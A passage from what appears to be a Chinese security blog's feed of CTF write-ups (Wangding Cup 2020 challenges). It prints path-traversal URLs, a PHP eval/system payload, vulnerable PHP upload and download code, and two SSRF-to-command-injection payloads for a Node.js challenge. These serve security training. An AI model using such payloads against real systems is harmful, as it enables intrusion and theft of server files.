&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="第三章-web进阶-逻辑漏洞"><a href="#第三章-web进阶-逻辑漏洞" class="headerlink" title="[第三章 web进阶]逻辑漏洞"></a>[第三章 web进阶]逻辑漏洞</h1><ul><li>修改价格为负数，先赚钱，再去买flag</li></ul><h1 id="第三章-web进阶-Python里的SSRF"><a href="#第三章-web进阶-Python里的SSRF" class="headerlink" title="[第三章 web进阶]Python里的SSRF"></a>[第三章 web进阶]Python里的SSRF</h1><p><a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html">https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003757.png" alt="image-20201207003632241"></p><p>啊这，直接 127.0.0.1,没有用。尝试用8进制绕，不行，换成127.0.0.2就成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201207003750.png" alt="image-20201207003614371"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一章-web入门-常见的搜集&quot;&gt;&lt;a href=&quot;#第一章-web入门-常见的搜集&quot; class=&quot;headerlink&quot; title=&quot;[第一章 web入门]常见的搜集&quot;&gt;&lt;/a&gt;[第一章 web入门]常见的搜集&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;robots.txt</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020年网鼎杯总决赛复现</title>
    <link href="https://hack-for.fun/d3b1.html"/>
    <id>https://hack-for.fun/d3b1.html</id>
    <published>2020-12-05T16:20:39.000Z</published>
    <updated>2020-12-06T16:43:06.558Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-总决赛-Novel"><a href="#网鼎杯-2020-总决赛-Novel" class="headerlink" title="[网鼎杯 2020 总决赛]Novel"></a>[网鼎杯 2020 总决赛]Novel</h1><p>上传，备份的时候转为了php。</p><p><code>echo $&#123;eval(eval(system(ifconfig)))&#125;;</code></p><p><code>php &gt; echo $&#123;eval(system(ifconfig))&#125;;</code></p><p>上传时的请求包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201206011537.png" alt="image-20201206003951631"></p><p>私藏的请求包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201206011538.png" alt="image-20201206003933467"></p><p>带上密码去访问，有点想访问webshell的感觉。只不过这里相当于有两个密码。</p><h1 id="网鼎杯-2020-总决赛-Game-Exp"><a href="#网鼎杯-2020-总决赛-Game-Exp" class="headerlink" title="[网鼎杯 2020 总决赛]Game Exp"></a>[网鼎杯 2020 总决赛]Game Exp</h1><h1 id="网鼎杯-2020-总决赛-Vulnfaces"><a href="#网鼎杯-2020-总决赛-Vulnfaces" class="headerlink" title="[网鼎杯 2020 总决赛]Vulnfaces"></a>[网鼎杯 2020 总决赛]Vulnfaces</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-总决赛-Novel&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-总决赛-Novel&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 总决赛]Novel&quot;&gt;&lt;/a&gt;[网鼎杯 2020 总决赛]Novel&lt;/h1&gt;&lt;p&gt;上传，备</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2020年网鼎杯半决赛复现</title>
    <link href="https://hack-for.fun/6ebd.html"/>
    <id>https://hack-for.fun/6ebd.html</id>
    <published>2020-12-05T08:16:12.000Z</published>
    <updated>2020-12-05T16:10:35.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h1><p>右手就行的题目。。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>直接 <code>/flag</code>  也行</p><h1 id="网鼎杯-2020-半决赛-faka"><a href="#网鼎杯-2020-半决赛-faka" class="headerlink" title="[网鼎杯 2020 半决赛]faka"></a>[网鼎杯 2020 半决赛]faka</h1><p>一个tp二次开发的站点，有数据库文件。打开数据库文件，在system_user中可以看到admin 账号的hash，在somd5中可以直接解出来。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201205232546.png" alt="image-20201205220254897"></p><p><a href="https://www.somd5.com/%EF%BC%8C%E4%B8%BA">https://www.somd5.com/，为</a> admincccbbb123</p><h2 id="后台文件上传GetShell"><a href="#后台文件上传GetShell" class="headerlink" title="后台文件上传GetShell"></a>后台文件上传GetShell</h2><p>进入后台</p><ul><li>上传点</li><li>注入点</li><li>命令执行点</li></ul><p>找到上传点，抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20201205232547.png" alt="image-20201205223232188"></p><p>post的数据中有md5的hash，同时也是拼接到了路径中的。</p><p><a href="https://xz.aliyun.com/t/7838">https://xz.aliyun.com/t/7838</a></p><p>找到对应的文件上传点的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUploadFile</span>(<span class="params">$field, $url = <span class="literal">false</span>, $extison = []</span>) </span>&#123;</span><br><span class="line">    $request = \think\Request::instance();</span><br><span class="line">    $file    = $request-&gt;file($field);</span><br><span class="line">    <span class="keyword">if</span> (!$file) &#123;</span><br><span class="line">        <span class="keyword">return</span> wrong(<span class="string">&#x27;上传文件不存在&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ext      = pathinfo($file-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), <span class="number">4</span>);</span><br><span class="line">    $md5      = [uniqid(), uniqid()];</span><br><span class="line">    $filename = join(<span class="string">&#x27;/&#x27;</span>, $md5) . <span class="string">&quot;.&#123;$ext&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($extison)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $extison)) &#123;</span><br><span class="line">            <span class="keyword">return</span> wrong(<span class="string">&#x27;文件上传类型受限&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ext == <span class="string">&#x27;php&#x27;</span> || !in_array(strtolower($ext), explode(<span class="string">&#x27;,&#x27;</span>, strtolower(sysconf(<span class="string">&#x27;storage_local_exts&#x27;</span>))))) &#123;</span><br><span class="line">            <span class="keyword">return</span> wrong(<span class="string">&#x27;文件上传类型受限&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件上传处理</span></span><br><span class="line">    <span class="keyword">if</span> (($info = $file-&gt;move(<span class="string">&#x27;static&#x27;</span> . DS . <span class="string">&#x27;upload&#x27;</span> . DS . $md5[<span class="number">0</span>], $md5[<span class="number">1</span>], <span class="literal">true</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($url) &#123;</span><br><span class="line">            $site_url = FileService::getFileUrl($filename, <span class="string">&#x27;local&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ($site_url) &#123;</span><br><span class="line">                <span class="keyword">return</span> right([<span class="string">&#x27;file&#x27;</span> =&gt; $site_url, <span class="string">&#x27;filename&#x27;</span> =&gt; $filename, <span class="string">&#x27;resource&#x27;</span> =&gt; $info], <span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> wrong(<span class="string">&#x27;获取上传文件&#x27;</span> . $filename . <span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> right([<span class="string">&#x27;file&#x27;</span> =&gt; ROOT_PATH . <span class="string">&#x27;/static/upload/&#x27;</span> . $filename, <span class="string">&#x27;filename&#x27;</span> =&gt; $filename, <span class="string">&#x27;resource&#x27;</span> =&gt; $info], <span class="string">&#x27;上传成功&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> wrong(<span class="string">&#x27;保存上传文件&#x27;</span> . $filename . <span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildSaveName</span>(<span class="params">$savename</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 自动生成文件名</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">true</span> === $savename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;rule <span class="keyword">instanceof</span> \<span class="built_in">Closure</span>) &#123;</span><br><span class="line">            $savename = call_user_func_array(<span class="keyword">$this</span>-&gt;rule, [<span class="keyword">$this</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;rule) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;date&#x27;</span>:</span><br><span class="line">                    $savename = date(<span class="string">&#x27;Ymd&#x27;</span>) . DS . md5(microtime(<span class="literal">true</span>));</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;rule, hash_algos())) &#123;</span><br><span class="line">                        $hash     = <span class="keyword">$this</span>-&gt;hash(<span class="keyword">$this</span>-&gt;rule);</span><br><span class="line">                        $savename = substr($hash, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($hash, <span class="number">2</span>);</span><br><span class="line">                    &#125; <span class="keyword">elseif</span> (is_callable(<span class="keyword">$this</span>-&gt;rule)) &#123;</span><br><span class="line">                        $savename = call_user_func(<span class="keyword">$this</span>-&gt;rule);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $savename = date(<span class="string">&#x27;Ymd&#x27;</span>) . DS . md5(microtime(<span class="literal">true</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="string">&#x27;&#x27;</span> === $savename || <span class="literal">false</span> === $savename) &#123;</span><br><span class="line">        $savename = <span class="keyword">$this</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!strpos($savename, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">        $savename .= <span class="string">&#x27;.&#x27;</span> . pathinfo(<span class="keyword">$this</span>-&gt;getInfo(<span class="string">&#x27;name&#x27;</span>), PATHINFO_EXTENSION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $savename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用前提就是token 和 上传文件的路径 可控。</p><p>emem，难点就是构造上传表单。</p><blockquote><p>那个上传表单不知道是构造的还是抓包抓到的，我怎么没有抓到？</p></blockquote><h2 id="后台权限任意文件下载"><a href="#后台权限任意文件下载" class="headerlink" title="后台权限任意文件下载"></a>后台权限任意文件下载</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;manage&#x2F;Backup&#x2F;downloadBak?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">downloadBak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $file_name = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file_dir = <span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!file_exists($file_dir . <span class="string">&quot;/&quot;</span> . $file_name)) &#123; <span class="comment">//检查文件是否存在</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $file = fopen($file_dir . <span class="string">&quot;/&quot;</span> . $file_name, <span class="string">&quot;r&quot;</span>); <span class="comment">// 打开文件</span></span><br><span class="line">        <span class="comment">// 输入文件标签</span></span><br><span class="line">        header(<span class="string">&#x27;Content-Encoding: none&#x27;</span>);</span><br><span class="line">        header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;Accept-Ranges: bytes&quot;</span>);</span><br><span class="line">        header(<span class="string">&quot;Accept-Length: &quot;</span> . filesize($file_dir . <span class="string">&quot;/&quot;</span> . $file_name));</span><br><span class="line">        header(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">        header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . $file_name);  <span class="comment">//以真实文件名提供给浏览器下载</span></span><br><span class="line">        header(<span class="string">&#x27;Pragma: no-cache&#x27;</span>);</span><br><span class="line">        header(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line">        <span class="comment">//输出文件内容</span></span><br><span class="line">        <span class="keyword">echo</span> fread($file, filesize($file_dir . <span class="string">&quot;/&quot;</span> . $file_name));</span><br><span class="line">        fclose($file);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="网鼎杯-2020-半决赛-BabyJS"><a href="#网鼎杯-2020-半决赛-BabyJS" class="headerlink" title="[网鼎杯 2020 半决赛]BabyJS"></a>[网鼎杯 2020 半决赛]BabyJS</h1><p>nodejs 的代码审计题，down下源码，执行 <code>npm audit</code> ， 下面是一些重要的漏洞。原型链污染，RCE，sandbox bypass RCE。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ High          │ Prototype Pollution Protection Bypass                        │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ qs                                                           │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ express                                                      │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ express &gt; qs                                                 │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;1469                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ High          │ Prototype Pollution Protection Bypass                        │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ qs                                                           │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ body-parser                                                  │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ body-parser &gt; qs                                             │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;1469                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Moderate      │ Code Injection                                               │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ morgan                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ morgan                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ morgan                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;736                             │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Low           │ Prototype Pollution                                          │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ lodash                                                       │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ request-promise                                              │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ request-promise &gt; request-promise-core &gt; lodash              │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;1523                            │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br><span class="line">┌───────────────┬──────────────────────────────────────────────────────────────┐</span><br><span class="line">│ Critical      │ Sandbox Bypass Leading to Arbitrary Code Execution           │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Package       │ constantinople                                               │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Patched in    │ &gt;&#x3D;3.1.1                                                      │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Dependency of │ jade                                                         │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ Path          │ jade &gt; constantinople                                        │</span><br><span class="line">├───────────────┼──────────────────────────────────────────────────────────────┤</span><br><span class="line">│ More info     │ https:&#x2F;&#x2F;npmjs.com&#x2F;advisories&#x2F;568                             │</span><br><span class="line">└───────────────┴──────────────────────────────────────────────────────────────┘</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>em… 当看到<code>routes/index.js</code> 中的代码时，就知道是要<code>SSRF</code>了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blacklist=[<span class="string">&#x27;127.0.0.1.xip.io&#x27;</span>,<span class="string">&#x27;::ffff:127.0.0.1&#x27;</span>,<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="string">&#x27;[::1]&#x27;</span>,<span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/debug&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.ip);</span><br><span class="line">    <span class="keyword">if</span>(blacklist.indexOf(req.ip)!=<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;res&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> u=req.query.url.replace(<span class="regexp">/[\&quot;\&#x27;]/ig</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(url.parse(u).href);</span><br><span class="line"><span class="keyword">let</span> log=<span class="string">`echo  &#x27;<span class="subst">$&#123;url.parse(u).href&#125;</span>&#x27;&gt;&gt;/tmp/log`</span>;</span><br><span class="line"><span class="built_in">console</span>.log(log);</span><br><span class="line">child_process.exec(log);</span><br><span class="line">res.json(&#123;<span class="attr">data</span>:fs.readFileSync(<span class="string">&#x27;/tmp/log&#x27;</span>).toString()&#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.json(&#123;&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/debug&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(req.body);</span><br><span class="line">    <span class="keyword">if</span>(req.body.url !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> u = req.body.url;</span><br><span class="line"><span class="keyword">var</span> urlObject=url.parse(u);</span><br><span class="line"><span class="keyword">if</span>(blacklist.indexOf(urlObject.hostname) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> dest=urlObject.href;</span><br><span class="line">request(dest,<span class="function">(<span class="params">err,result,body</span>)=&gt;</span>&#123;</span><br><span class="line">res.json(body);</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">res.json([]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，get方式请求的<code>/debug</code> 有许多过滤（过滤了单、双引号、括号 []），而post请求方式中没有。但是要执行命令就必须能够调用到get中的debug路由，因此目的也很明确了，</p><blockquote><p>通过post /debug去 ssrf get /debug</p></blockquote><p>因为返回是json格式，所以传递的数据也是json格式的。将/flag 复制到 /tmp/log 下，这样就能以json格式打印出来了。</p><p>SSRF Bypass：<a href="https://www.secpulse.com/archives/65832.html">https://www.secpulse.com/archives/65832.html</a></p><p>payload1，单引号二次编码一下绕</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;0177.0.0.1:3000&#x2F;debug?url&#x3D;http:&#x2F;&#x2F;a%2527@a;cp$IFS&#x2F;flag$IFS&#x2F;tmp&#x2F;log%00&quot;&#125;</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;0177.0.0.1:3000&#x2F;debug?url&#x3D;http:&#x2F;&#x2F;%EF%BC%87;cp$IFS&#x2F;flag$IFS&#x2F;tmp&#x2F;log%2500&quot;&#125;</span><br></pre></td></tr></table></figure><p>这串解出来正好是一个单引号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%EF%BC%87</span><br></pre></td></tr></table></figure><h1 id="参考WP"><a href="#参考WP" class="headerlink" title="参考WP"></a>参考WP</h1><p><a href="https://blog.csdn.net/weixin_42337765/article/details/110298641">https://blog.csdn.net/weixin_42337765/article/details/110298641</a></p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">https://www.cnblogs.com/W4nder/p/14078695.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网鼎杯-2020-半决赛-AliceWebsite&quot;&gt;&lt;a href=&quot;#网鼎杯-2020-半决赛-AliceWebsite&quot; class=&quot;headerlink&quot; title=&quot;[网鼎杯 2020 半决赛]AliceWebsite&quot;&gt;&lt;/a&gt;[网鼎杯 2020 </summary>
      
    
    
    
    
    <category term="CTF" scheme="https://hack-for.fun/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>某市HW2020红队心得总结</title>
    <link href="https://hack-for.fun/6988.html"/>
    <id>https://hack-for.fun/6988.html</id>
    <published>2020-12-04T16:31:53.000Z</published>
    <updated>2020-12-04T17:35:33.819Z</updated>
    
